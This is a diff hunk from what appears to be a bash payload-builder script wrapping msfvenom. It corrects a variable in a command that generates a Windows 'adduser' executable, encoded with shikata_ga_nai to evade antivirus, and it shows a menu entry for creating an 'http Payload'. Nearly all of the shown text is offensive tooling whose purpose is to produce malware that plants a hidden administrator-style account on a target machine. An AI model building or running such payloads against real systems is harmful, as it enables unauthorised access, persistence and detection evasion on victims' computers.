@@ -398,7 +398,7 @@ elif [[ $input == "4" ]]; then ## Windows
             echo -e "\nPassword Should be complex:${XX}"
             read -p "Username: " US
             read -p "Password: " PS
-            msfvenom -p windows/adduser -f exe USER=$US PASS=$PS -e x86/shikata_ga_nai -i SH -o Payload_List/User_Account/account.exe
+            msfvenom -p windows/adduser -f exe USER=$US PASS=$PS -e x86/shikata_ga_nai -i $SH -o Payload_List/User_Account/account.exe
             echo -e "\n${RED}DONE, look into Payload_List/User_Account${XX}"
     elif [[ $ty == "4" ]]; then
         echo -e "\n${BLUE}[+] Creating http Payload:${XX}"
